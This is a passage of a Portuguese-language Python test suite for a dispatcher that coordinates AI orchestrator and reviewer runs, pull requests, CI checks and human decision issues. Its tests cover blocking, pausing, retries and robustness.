            rid = self.orquestrador()["runId"]
            if rid:
                self.motor.definir_run(rid, estado="succeeded")
            d.ciclo()

    def test_sem_pr_para_em_dois_runs_e_abre_uma_decisao(self):
        d, _ = self.acordar_por_falha()
        self.terminar_sem_pr(d)
        self.assertEqual(len(self.runs(FABLE)), 2)
        decisoes = [(t, c) for t, c in self.forja.decisoes if t == TITULO_SEM_PLANO]
        self.assertEqual(len(decisoes), 1)
        self.assertIn("2 vezes seguidas", decisoes[0][1])
        self.assertIn("run do orquestrador terminou sem PR", decisoes[0][1])
        orq = self.orquestrador()
        self.assertIsNone(orq["runId"])
        self.assertEqual(orq["semResultadoSeguidos"], 2)
        # só a resposta do Paulo volta a acordar o orquestrador, e ela zera o contador
        url = [x for x in self.estado()["decisoes"] if x.get("tipo") == "bloqueio"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="Divida a raia a em duas.")
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 3)
        self.assertIn("Motivo: resposta_paulo", self.runs(FABLE)[-1]["prompt"])
        self.assertIn("Divida a raia a em duas.", self.runs(FABLE)[-1]["prompt"])
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 0)

    def test_plano_invalido_em_cadeia_tambem_para_e_os_prs_sao_fechados(self):
        d, _ = self.acordar_por_falha()
        urls = []
        for i in range(6):
            rid = self.orquestrador()["runId"]
            if rid:
                url = "https://github.com/dono/cliente/pull/%d" % (100 + i)
                urls.append(url)
                self.pr_do_orquestrador(
                    rid, [".fabrica/plano.json"], '{"versao": 1, "raias": "x"}', head=_gerar_head(100 + i), url=url
                )
            d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertEqual([t for t, _ in self.forja.decisoes].count(TITULO_SEM_PLANO), 1)
        self.assertEqual(self.forja.merges, [])
        fechados = [u for u, _ in self.forja.fechados]
        self.assertEqual(sorted(fechados), sorted(urls))
        self.assertTrue(all("inválido" in c for u, c in self.forja.fechados))

    def test_resposta_do_paulo_a_qualquer_decisao_zera_o_contador(self):
        d, rid = self.acordar_por_falha()
        outra = self.forja.abrir_decisao(REPO, "t", "c")
        d.estado["decisoes"].append({"url": outra, "motivo": "pergunta", "alvo": "x"})
        d._salvar()
        self.motor.definir_run(rid, estado="succeeded")
        d.ciclo()
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 1)
        self.forja.definir_decisao(outra, fechada=True, ultimo_comentario="resposta")
        d.ciclo()
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 0)

    def test_merge_do_orquestrador_zera_o_contador(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="succeeded")
        d.ciclo()
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 1)
        rid = self.orquestrador()["runId"]
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")))
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 0)

    def test_bloqueio_segura_as_outras_acordadas_ate_a_resposta(self):
        d, _ = self.acordar_por_falha(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        self.terminar_sem_pr(d, 3)
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.motor.definir_plano("plano-2", "failed", [], falha="cancelado")
        for _ in range(3):
            d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)  # raia b falhou, mas o orquestrador está bloqueado
        url = [x for x in self.estado()["decisoes"] if x.get("tipo") == "bloqueio"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="ok")
        d.ciclo()
        self.assertIn("Motivo: raia_falhou", self.runs(FABLE)[-1]["prompt"])
        self.assertIn('"raia": "b"', self.runs(FABLE)[-1]["prompt"])
        rid = self.orquestrador()["runId"]
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d.ciclo()
        d.ciclo()
        self.assertIn("Motivo: resposta_paulo", self.runs(FABLE)[-1]["prompt"])


    def test_respostas_do_paulo_passam_pelo_bloqueio(self):
        d, _ = self.acordar_por_falha()
        outra = self.forja.abrir_decisao(REPO, "t", "c")
        d.estado["decisoes"].append({"url": outra, "motivo": "pergunta antiga", "alvo": "x"})
        d._salvar()
        self.terminar_sem_pr(d, 3)
        self.assertTrue(self.orquestrador()["bloqueio"])
        n = len(self.runs(FABLE))
        self.forja.definir_decisao(outra, fechada=True, ultimo_comentario="RESPOSTA-ANTIGA")
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), n + 1)
        self.assertIn("RESPOSTA-ANTIGA", self.runs(FABLE)[-1]["prompt"])
        self.assertTrue(self.orquestrador()["bloqueio"])  # o bloqueio continua até a issue dele
        # o run da resposta também termina sem PR: nada de plano_invalido enquanto bloqueado
        url = self.orquestrador()["bloqueio"]["url"]
        self.terminar_sem_pr(d, 3)
        self.assertEqual(len(self.runs(FABLE)), n + 1)
        self.assertEqual(self.orquestrador()["bloqueio"]["url"], url)  # a issue do bloqueio continua ligada
        self.assertFalse(any("3 vezes seguidas" in a for a in self.estado()["avisos"]))
        self.assertEqual([t for t, _ in self.forja.decisoes].count(TITULO_SEM_PLANO), 1)

    def test_duas_respostas_sem_resultado_durante_o_bloqueio_mantem_a_issue_ligada(self):
        """c07: as duas respostas passam pelo bloqueio e os dois runs ficam sem PR."""
        d, _ = self.acordar_por_falha()
        outras = [self.forja.abrir_decisao(REPO, "t%d" % i, "c") for i in range(2)]
        for i, u in enumerate(outras):
            d.estado["decisoes"].append({"url": u, "motivo": "pergunta %d" % i, "alvo": "x"})
        d._salvar()
        self.terminar_sem_pr(d, 3)
        url = self.orquestrador()["bloqueio"]["url"]
        for u in outras:
            self.forja.definir_decisao(u, fechada=True, ultimo_comentario="resposta")
        for _ in range(6):
            rid = self.orquestrador()["runId"]
            if rid:
                self.motor.definir_run(rid, estado="succeeded")
            d.ciclo()
            self.assertEqual(self.orquestrador()["bloqueio"]["url"], url)
        self.assertEqual([t for t, _ in self.forja.decisoes].count(TITULO_SEM_PLANO), 1)
        self.assertEqual(sum("Motivo: resposta_paulo" in r["prompt"] for r in self.runs(FABLE)), 2)

    def test_plano_invalido_leva_a_acordada_anterior(self):
        d = self.preparar_raia()
        url = self.forja.abrir_decisao(REPO, "t", "c")
        d.estado["decisoes"].append({"url": url, "motivo": "qual banco?", "alvo": "x"})
        d._salvar()
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="use Postgres 17")
        d.ciclo()
        self.motor.definir_run(self.orquestrador()["runId"], estado="succeeded")
        d.ciclo()
        ultimo = self.runs(FABLE)[-1]["prompt"]
        self.assertIn("Motivo: plano_invalido", ultimo)
        self.assertIn("use Postgres 17", ultimo)
        self.assertIn("acordadaAnterior", ultimo)


class TestesB_AcordadaPreservada(Base):
    def test_resposta_do_paulo_sobrevive_a_um_run_oom(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/pergunta.md"], pergunta="Postgres ou SQLite?")
        d.ciclo()
        url = self.estado()["decisoes"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="RESPOSTA-DO-PAULO: Postgres")
        d.ciclo()
        rid2 = self.orquestrador()["runId"]
        self.assertEqual(self.orquestrador()["acordada"]["motivo"], "resposta_paulo")
        self.motor.definir_run(rid2, estado="failed", motivoFalha="oom_killed")
        d.ciclo()
        ultimo = self.runs(FABLE)[-1]["prompt"]
        self.assertNotEqual(self.orquestrador()["runId"], rid2)
        self.assertIn("Motivo: resposta_paulo", ultimo)
        self.assertIn("RESPOSTA-DO-PAULO: Postgres", ultimo)
        self.assertIn("Postgres ou SQLite?", ultimo)
        self.assertEqual(self.estado()["falhasAcordar"], 1)

    def test_nova_spec_e_refeita_com_a_spec_quando_o_run_falha(self):
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar(spec="docs/spec.md")
        rid = self.orquestrador()["runId"]
        self.motor.definir_run(rid, estado="failed", motivoFalha="timeout")
        d.ciclo()
        ultimo = self.runs(FABLE)[-1]["prompt"]
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertIn("Motivo: nova_spec", ultimo)
        self.assertIn('"spec": "docs/spec.md"', ultimo)
        self.assertNotIn("plano_invalido", ultimo)

    def test_tres_falhas_seguidas_pausam_com_uma_decisao_e_fechar_retoma(self):
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar(spec="docs/spec.md")
        for _ in range(5):
            rid = self.orquestrador()["runId"]
            if rid:
                self.motor.definir_run(rid, estado="cancelled")
            d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 3)
        self.assertTrue(self.estado()["pausado"])
        pausas = [x for x in self.forja.decisoes if x[0].startswith("[fábrica] despachante pausado")]
        self.assertEqual(len(pausas), 1)
        url = self.estado()["decisaoPausa"]["url"]
        self.forja.definir_decisao(url, fechada=True)
        d.ciclo()
        self.assertIsNone(self.estado()["pausado"])
        self.assertEqual(self.estado()["falhasAcordar"], 0)
        self.assertEqual(len(self.runs(FABLE)), 4)
        self.assertIn("Motivo: nova_spec", self.runs(FABLE)[-1]["prompt"])

    def test_estado_desconhecido_vira_failed_com_aviso_unico(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="canceled")
        d.ciclo()
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertIn("Motivo: raia_falhou", self.runs(FABLE)[-1]["prompt"])
        avisos = [a for a in self.estado()["avisos"] if "'canceled'" in a]
        self.assertEqual(len(avisos), 1)

    def test_cota_no_orquestrador_pausa_e_guarda_a_acordada(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
        self.motor.definir_texto(rid, "429 rate limit")
        d.ciclo()
        self.assertEqual(self.estado()["pausado"], "cota")
        (pendente,) = self.estado()["acordarPendentes"]
        self.assertEqual((pendente["motivo"], pendente["alvo"]), ("raia_falhou", "a"))


class TestesC_CiDoPrDoOrquestrador(Base):
    def test_pendente_espera_sem_concluir_e_mergeia_quando_fica_verde(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci="pendente")
        d.ciclo()
        self.instante += datetime.timedelta(minutes=90)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(self.orquestrador()["runId"], rid)
        self.forja.definir_ci(REPO, H3, "verde")
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        self.assertIsNone(self.orquestrador()["runId"])

    def test_pendente_por_mais_de_2h_abre_decisao(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci="pendente")
        d.ciclo()
        self.instante += datetime.timedelta(hours=2, minutes=1)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((_, corpo),) = self.forja.decisoes
        self.assertIn("CI pendente", corpo)
        self.assertIsNone(self.orquestrador()["runId"])

    def test_vermelho_e_ausente_obrigatorio_abrem_decisao_e_contam(self):
        for ci, config in (("vermelho", CONFIG), ("ausente", dict(CONFIG, ciObrigatorioNoPlano=True))):
            with self.subTest(ci=ci):
                self.setUp()
                self.config_padrao = config
                d, rid = self.acordar_por_falha()
                self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci=ci)
                d.ciclo()
                self.assertEqual(self.forja.merges, [])
                ((_, corpo),) = self.forja.decisoes
                self.assertIn("CI " + ci, corpo)
                self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 1)
                self.assertIsNone(self.orquestrador()["runId"])


class TestesC2_FalhaAoTratarOPr(Base):
    def test_ci_ilegivel_5_vezes_abre_decisao_e_conclui(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci=None)
        for _ in range(4):
            d.ciclo()
        self.assertEqual(self.orquestrador()["runId"], rid)
        self.assertEqual(self.forja.decisoes, [])
        d.ciclo()
        self.assertIsNone(self.orquestrador()["runId"])
        ((titulo, corpo),) = self.forja.decisoes
        self.assertIn("5 ciclos seguidos", corpo)
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 1)
        self.assertNotIn("falhasTratar", self.orquestrador())


class TestesD2_AvisoDePlanRunIlegivel(Base):
    def test_plan_run_ilegivel_avisa_uma_vez(self):
        self.motor = MotorLeituraFalha()
        d = self.preparar_raia(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        self.motor.falhando.add("plano-1")
        for _ in range(12):
            d.ciclo()
        avisos = [a for a in self.estado()["avisos"] if "plano-1" in a]
        self.assertEqual(len(avisos), 1)


class TestesD_WarrenInstavel(Base):
    def test_revisao_ilegivel_por_5_ciclos_vira_failed_e_e_refeita(self):
        self.motor = MotorLeituraFalha()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.falhando.add(rid)
        for _ in range(4):
            d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["revisaoRunId"], rid)
        d.ciclo()
        self.assertTrue(any(rid in a and "5 falhas" in a for a in self.estado()["avisos"]))
        self.assertEqual(len(self.runs(OPUS)), 2)
        self.assertNotEqual(self.estado()["seeds"]["s-1"]["revisaoRunId"], rid)

    def test_run_do_orquestrador_que_sumiu_conclui_e_reenfileira(self):
        d, rid = self.acordar_por_falha(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        del self.motor._runs[rid]  # o Plan Run da raia b ainda se lê: há leitura boa no ciclo
        d.ciclo()
        self.assertTrue(any(rid in a and "404" in a for a in self.estado()["avisos"]))
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertIn("Motivo: raia_falhou", self.runs(FABLE)[-1]["prompt"])

    def test_warren_inacessivel_por_5_ciclos_abre_uma_decisao_que_fecha_sozinha(self):
        self.motor = MotorLeituraFalha()
        d = self.preparar_raia()
        self.motor.todos = True
        for _ in range(4):
            d.ciclo()
        self.assertEqual(self.forja.decisoes, [])
        for _ in range(5):
            d.ciclo()
        titulos = [t for t, _ in self.forja.decisoes]
        self.assertEqual(titulos, ["[fábrica] Warren inacessível"])
        url = self.estado()["warrenFora"]["url"]
        self.motor.todos = False
        d.ciclo()
        d.ciclo()
        self.assertFalse(self.forja.decisao(url)["fechada"])  # P4: histerese de 3 ciclos limpos
        d.ciclo()
        self.assertIsNone(self.estado()["warrenFora"].get("url"))
        self.assertTrue(self.forja.decisao(url)["fechada"])
        self.assertTrue(any("Warren voltou" in a for a in self.estado()["avisos"]))


class TestesE_OperacaoZeroManual(Base):
    def pausar_por_cota(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
        self.motor.definir_texto(rid, "quota reached")
        d.ciclo()
        return d

    def test_e1_pausa_abre_uma_decisao_e_fechar_retoma(self):
        d = self.pausar_por_cota()
        d.ciclo()
        d.ciclo()
        pausas = [t for t, _ in self.forja.decisoes]
        self.assertEqual(pausas, ["[fábrica] despachante pausado: cota"])
        url = self.estado()["decisaoPausa"]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="")
        acoes = d.ciclo()
        self.assertIsNone(self.estado()["pausado"])
        self.assertIsNone(self.estado().get("decisaoPausa"))
        self.assertEqual([a["tipo"] for a in acoes], ["revisar"])

    def test_e1_retomar_por_fora_fecha_a_decisao_de_pausa(self):
        d = self.pausar_por_cota()
        url = self.estado()["decisaoPausa"]["url"]
        d.retomar()
        d.ciclo()
        self.assertTrue(self.forja.decisao(url)["fechada"])
        self.assertIn(("fechar_decisao", url), [(n, a.get("url")) for n, a in self.forja.chamadas])
        self.assertIsNone(self.estado().get("decisaoPausa"))

    def test_e2_com_a_trava_tomada_iniciar_spec_e_retomar_viram_pedidos(self):
        d = self.pausar_por_cota()
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        ambiente = {"FABRICA_RAIZ": str(self.raiz)}
        with despachante.travar(self.raiz):
            for argv in (["iniciar", "--spec", "docs/spec.md"], ["retomar"]):
                saida = io.StringIO()
                self.assertEqual(despachante.main(argv, ambiente=ambiente, construir=self.fail, saida=saida), 0)
                self.assertIn("pedido enfileirado", saida.getvalue())
            for argv in (["iniciar"], ["rodar"]):
                erro = io.StringIO()
                self.assertEqual(despachante.main(argv, ambiente=ambiente, construir=self.fail, erro=erro), 3)
        pedidos = sorted(p.name for p in (self.raiz / "entrada").iterdir())
        self.assertEqual(len(pedidos), 2)
        self.assertTrue(all(n.endswith(".json") and not n.startswith(".") for n in pedidos))
        self.assertEqual(self.runs(FABLE), [])
        d.ciclo()
        self.assertEqual(list((self.raiz / "entrada").iterdir()), [])
        self.assertIsNone(self.estado()["pausado"])
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertIn("Motivo: nova_spec", self.runs(FABLE)[0]["prompt"])

    def test_e2_pedidos_invalidos_sao_descartados_com_aviso(self):
        d = self.preparar_raia()
        entrada = self.raiz / "entrada"
        entrada.mkdir()
        (entrada / "0001.json").write_text("{quebrado", encoding="utf-8")
        (entrada / "0002.json").write_text('{"comando": "apagar_tudo"}', encoding="utf-8")
        (entrada / "0003.json").write_text('{"comando": "iniciar", "spec": "docs/nao-existe.md"}', encoding="utf-8")
        (entrada / ".0004.json.1.tmp").write_text("{}", encoding="utf-8")
        d.ciclo()
        self.assertEqual([p.name for p in entrada.iterdir()], [".0004.json.1.tmp"])
        avisos = " | ".join(self.estado()["avisos"])
        self.assertIn("0001.json", avisos)
        self.assertIn("apagar_tudo", avisos)
        self.assertIn("docs/nao-existe.md", avisos)
        self.assertEqual(self.runs(FABLE), [])

    def test_corpo_de_issue_sai_sem_token(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/pergunta.md"], pergunta="Use o token %s?" % TOKEN)
        d.ciclo()
        ((titulo, corpo),) = self.forja.decisoes
        self.assertNotIn(TOKEN, titulo + corpo)
        self.assertIn("Use o token ***?", corpo)

    def test_e3_pr_da_pergunta_e_fechado_quando_respondida(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/pergunta.md"], pergunta="Qual banco?")
        d.ciclo()
        self.assertEqual(self.forja.fechados, [])
        url = self.estado()["decisoes"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="Postgres")
        d.ciclo()
        d.ciclo()
        self.assertEqual([u for u, _ in self.forja.fechados], [PR_ORQ])
        self.assertFalse(self.forja.pr(PR_ORQ)["aberto"])

    def test_e3_pr_recusado_e_fechado_quando_substituido(self):
        d, rid = self.acordar_por_falha(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        self.pr_do_orquestrador(rid, [".fabrica/plano.json", ".fabrica/config.json"], plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d.ciclo()  # guarda (a): vai para o Paulo e o PR fica aberto
        self.assertEqual(self.forja.fechados, [])
        self.motor.definir_plano("plano-2", "failed", [], falha="cancelado")
        d.ciclo()
        rid2 = self.orquestrador()["runId"]
        novo = "https://github.com/dono/cliente/pull/91"
        self.pr_do_orquestrador(
            rid2, [".fabrica/plano.json"], plano(raia("a"), raia("b", plano_seeds="pl-00bb")), head=H2, url=novo
        )
        d.ciclo()
        d.ciclo()
        self.assertEqual(self.forja.merges, [(novo, H2)])
        self.assertEqual([u for u, _ in self.forja.fechados], [PR_ORQ])
        self.assertIn(novo, self.forja.fechados[0][1])

    def test_e3_mergeado_por_fora_nao_e_fechado(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/pergunta.md"], pergunta="?")
        d.ciclo()
        self.forja.definir_pr(PR_ORQ, head_sha=H3, branch="warren/orq", arquivos=[".fabrica/pergunta.md"], aberto=False, mergeado=True)
        url = self.estado()["decisoes"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="ok")
        d.ciclo()
        d.ciclo()
        self.assertEqual(self.forja.fechados, [])


class TestesH_ReplanejamentoDeRaiaEmExecucao(Base):
    def test_planoseeds_novo_cancela_o_plan_run_fecha_os_prs_e_redespacha(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.publicar(plano(raia("a", plano_seeds="pl-00a2")))
        acoes = d.ciclo()
        self.assertIn(("cancelar_plano", {"plan_run_id": "plano-1"}), self.motor.chamadas)
        self.assertEqual(acoes[0], {"tipo": "cancelar_raia", "raia": "a", "planoSeeds": "pl-00a2"})
        self.assertNotIn("s-1", self.estado()["seeds"])
        self.assertEqual(self.estado()["raias"]["a"]["seedsSubstituidas"], ["s-1"])
        self.assertEqual([x["plano_seeds"] for x in self.planos_despachados()], ["pl-000a", "pl-00a2"])
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")
        self.assertNotEqual(self.estado()["raias"]["a"]["planRunId"], "plano-1")
        d.ciclo()
        self.assertEqual([u for u, _ in self.forja.fechados], [PR])
        self.assertIn("replanejada", self.forja.fechados[0][1])
        self.assertEqual(self.forja.merges, [])

    def test_cancelamento_que_falha_tenta_de_novo_e_desiste_na_quinta(self):
        class MotorSemCancelar(motor.MotorFalso):
            def cancelar_plano(self, plan_run_id):
                self._registrar("cancelar_plano", plan_run_id=plan_run_id)
                raise RuntimeError("POST /plan-runs/x/cancel: HTTP 500")

        self.motor = MotorSemCancelar()
        d = self.preparar_raia()
        self.publicar(plano(raia("a", plano_seeds="pl-00a2")))
        for _ in range(4):
            d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["planRunId"], "plano-1")
        d.ciclo()
        self.assertEqual(len([c for c in self.motor.chamadas if c[0] == "cancelar_plano"]), 5)
        self.assertEqual(self.planos_despachados()[-1]["plano_seeds"], "pl-00a2")
        self.assertTrue(any("cancelar" in a for a in self.estado()["avisos"]))


class TestesI_Robustez(Base):
    def test_i1_retry_after_infinito_ou_enorme(self):
        for valor, espera in ((float("inf"), 900), (10**9, 900), (float("nan"), 30)):
            with self.subTest(valor=valor):
                self.setUp()
                self.publicar(plano(raia("a")))
                d = self.novo()
                d.iniciar()
                self.motor.lotar(valor)
                sonos = []
                d.rodar(intervalo=7, ciclos=2, dormir=sonos.append)
                self.assertEqual(sonos, [espera])
                self.assertNotIn("acaoEmCurso", self.estado())
                self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")

    def test_i2_queda_no_aguardar_humano_nao_reabre_a_issue(self):
        class ForjaQueCai(forja.ForjaFalsa):
            cair = True

            def abrir_decisao(self, repo, titulo, corpo):
                url = super().abrir_decisao(repo, titulo, corpo)
                if self.cair and "s-1" in titulo:
                    raise KeyboardInterrupt
                return url

        self.forja = ForjaQueCai()
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/1.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        with self.assertRaises(KeyboardInterrupt):
            d.ciclo()
        self.forja.cair = False
        outro = self.novo()
        outro.ciclo()
        outro.ciclo()
        self.assertEqual(len([t for t, _ in self.forja.decisoes if "s-1" in t]), 1)
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")
        self.assertEqual([x["alvo"] for x in self.estado()["decisoes"]], ["s-1"])
        self.assertEqual(self.estado()["decisoesPendentes"], [])

    def test_i3_queda_depois_do_merge_do_orquestrador_nao_abre_decisao(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")))
        with mock.patch.object(despachante.est, "concluir_orquestrador", side_effect=KeyboardInterrupt):
            with self.assertRaises(KeyboardInterrupt):
                d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        outro = self.novo()
        outro.ciclo()
        self.assertEqual(self.forja.decisoes, [])
        self.assertIsNone(self.orquestrador()["runId"])
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 0)
        self.assertFalse(any("fora do despachante" in a for a in self.estado()["avisos"]))
        self.assertIn("merge_do_orquestrador", [x.get("evento") for x in self.log() if x.get("recuperado")])

    def test_i3_pr_do_orquestrador_mergeado_por_fora_so_avisa(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="succeeded")
        d.ciclo()  # sem PR: contador 1 e plano_invalido
        rid = self.orquestrador()["runId"]
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")))
        self.forja.definir_pr(PR_ORQ, head_sha=H3, branch="warren/orq", arquivos=[".fabrica/plano.json"], aberto=False, mergeado=True)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(self.forja.decisoes, [])
        self.assertTrue(any("fora do despachante" in a for a in self.estado()["avisos"]))
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 1)  # neutro: nem zera nem soma

    def test_i3_pr_de_seed_mergeado_sem_aviso_de_fechado(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.forja.definir_pr(PR, head_sha=H1, branch="warren/s-1", arquivos=["src/a/x.ts"], aberto=False, mergeado=True)
        d.ciclo()
        self.assertFalse(any("fechado sem merge" in a for a in self.estado()["avisos"]))

    def test_i4_veredito_so_com_tres_campos_e_estado_em_json_estrito(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, ci="vermelho")
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        corpo = '{"sha": "%s", "resultado": "aprovado", "achados": [{"arquivo": "a", "motivo": "b", "linha": NaN}], "confianca": Infinity}' % H1
        self.motor.definir_run(rid, estado="succeeded")
        self.motor.definir_texto(rid, f"{prompts.INICIO_VEREDITO}\n{corpo}\n{prompts.FIM_VEREDITO}")
        d.ciclo()

        def recusar(c):
            raise ValueError(c)

        texto = (self.raiz / "estado.json").read_text(encoding="utf-8")
        estado_ = json.loads(texto, parse_constant=recusar)
        for v in (estado_["seeds"]["s-1"]["veredito"], estado_["seeds"]["s-1"]["vereditoAnterior"]):
            if v is not None:
                self.assertEqual(set(v), {"sha", "resultado", "achados"})
                self.assertEqual(v["achados"], [{"arquivo": "a", "motivo": "b"}])
        with self.assertRaises(ValueError):
            despachante.gravar_json_atomico(self.raiz / "x.json", {"n": float("nan")})

    def test_i4_plano_com_nan_e_recusado(self):
        d = self.preparar_raia()
        texto = json.dumps(plano(raia("a"), raia("b", plano_seeds="pl-000b"))).replace('"versao": 1', '"versao": NaN')
        self.publicar(texto)
        d.ciclo()
        self.assertEqual(len(json.loads((self.raiz / "plano.json").read_text(encoding="utf-8"))["raias"]), 1)

    def test_i5_rodar_e_iniciar_tomam_a_trava(self):
        d = self.preparar_raia()
        with despachante.travar(self.raiz):
            with self.assertRaises(despachante.OutroDespachante):
                d.rodar(intervalo=1, ciclos=1, dormir=lambda s: None)
            with self.assertRaises(despachante.OutroDespachante):
                d.iniciar()
        d.rodar(intervalo=1, ciclos=1, dormir=lambda s: None)

    def test_i6_redespacho_com_o_mesmo_pr_e_head_nao_revisa_de_novo(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.motor.definir_plano("plano-1", "running", [{"seedId": "s-1", "estado": "running", "runId": "r2"}])
        d.ciclo()
        self.motor.definir_plano("plano-1", "running", [{"seedId": "s-1", "estado": "pr_open", "runId": "r2", "prUrl": PR}])
        d.ciclo()
        self.assertEqual(len(self.runs(OPUS)), 1)
        self.assertEqual(len(self.verificacoes), 1)
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR, H1)])

    def test_i6_head_novo_no_redespacho_revisa_de_novo(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.motor.definir_plano("plano-1", "running", [{"seedId": "s-1", "estado": "running", "runId": "r2"}])
        d.ciclo()
        self.motor.definir_plano("plano-1", "running", [{"seedId": "s-1", "estado": "pr_open", "runId": "r2", "prUrl": PR}])
        self.mover_head(H2)
        d.ciclo()
        self.assertEqual([r["prompt"].count(H2) > 0 for r in self.runs(OPUS)], [False, True])

    def test_i7_resposta_do_paulo_leva_o_alvo(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/1.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        url = self.estado()["decisoes"][0]["url"]
        self.forja.definir_decisao(url, fechada=True, ultimo_comentario="ok")
        d.ciclo()
        self.assertIn('"alvo": "s-1"', self.runs(FABLE)[-1]["prompt"])

    def test_i8_avisos_limitados_e_erro_repetido_logado_uma_vez(self):
        d = self.preparar_raia()
        d.estado["avisos"] = ["aviso %d" % i for i in range(300)]
        d._salvar()
        self.assertEqual(len(self.estado()["avisos"]), 200)
        self.assertEqual(self.estado()["avisos"][-1], "aviso 299")
        self.abrir_pr(H1)
        self.forja._ci.clear()
        for _ in range(4):
            d.ciclo()
        erros = [x for x in self.log() if x.get("etapa") == "observar_pr"]
        self.assertEqual(len(erros), 1)

    def test_i9_spec_repetida_diz_spec_ja_iniciada(self):
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        ambiente = {"FABRICA_RAIZ": str(self.raiz)}
        saidas = []
        for _ in range(2):
            saida = io.StringIO()
